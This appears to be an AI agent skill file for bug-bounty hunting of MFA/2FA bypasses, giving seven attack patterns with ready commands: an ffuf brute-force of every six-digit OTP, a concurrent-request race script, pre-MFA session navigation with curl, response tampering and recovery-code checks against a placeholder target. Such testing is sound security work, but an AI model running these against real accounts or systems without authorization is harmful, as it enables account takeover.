---
name: hunt-mfa-bypass
description: "Hunt MFA / 2FA bypass — 7 distinct patterns: (1) MFA not enforced on sensitive endpoints, (2) MFA-step skip via direct navigation, (3) MFA-token replay, (4) OTP brute-force without rate limit, (5) race condition on OTP validation, (6) recovery-code dump, (7) backup factor downgrade. Use when hunting auth bypass or chaining toward ATO."
report_count: 0
---

# HUNT-MFA-BYPASS — MFA/2FA Bypass Patterns

## 7 MFA Bypass Patterns

### Pattern 1: No Rate Limit on OTP
```bash
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5
```

### Pattern 2: OTP Reuse (Never Invalidated)
```
1. Login → receive OTP "123456" → enter → success
2. Logout → login again → try same OTP "123456"
3. If accepted → OTP never invalidated = ATO via OTP sniff
```

### Pattern 3: Response Manipulation
```
1. Enter wrong OTP → capture response
2. Change {"success":false} → {"success":true}
3. If app proceeds → client-side only MFA check
```

### Pattern 4: Skip MFA Step (Workflow Bypass)
```bash
# After password entry, app sets pre-mfa session
# Test /dashboard directly
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
```

### Pattern 5: Race Condition on OTP Validation
```python
import asyncio, aiohttp
async def try_otp(session, otp):
    async with session.post("https://target.com/api/mfa/verify", json={"otp": otp}) as r:
        return await r.text()
async def main():
    async with aiohttp.ClientSession() as s:
        # Fire 50 concurrent OTP attempts to race the validation window
        results = await asyncio.gather(*[try_otp(s, "000000") for _ in range(50)])
        print(results.count('"success":true'))
```

### Pattern 6: Recovery Code Exposure
```bash
# Check if /api/me or user profile endpoints expose backup codes
curl -s -b "session=AUTH_SESSION" "https://target.com/api/me" | grep -i "recovery\|backup"
```

### Pattern 7: Backup Factor Downgrade
```
1. Force app to fall back to SMS (from TOTP/authenticator)
2. SMS factor often has weaker rate limiting or can be intercepted
```

## Validation — Before Reporting
- Can attacker reach post-MFA state without valid OTP?
- Is the bypass reproduceable 3/3 times?
- Does it enable ATO (not just MFA annoyance)?

## Related Skills
- **hunt-ato** — full chain to account takeover
- **triage-validation** — 7-Question Gate
